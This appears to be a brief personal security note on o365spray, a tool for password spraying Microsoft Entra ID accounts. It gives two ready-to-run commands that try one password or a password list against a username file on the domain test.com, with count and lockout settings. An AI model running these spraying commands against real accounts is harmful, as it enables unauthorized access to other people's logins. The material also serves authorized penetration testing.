---
tags:
  - security
---
A tool to conduct [[Password Spraying]] on microsoft entra-id accounts.
# Single Password
```
o365spray --spray -U usernames.txt -p password --count 2 --lockout 5 --domain test.com
```
# Multiple Passwords
```
o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
```
- `--count 2`: Tries two times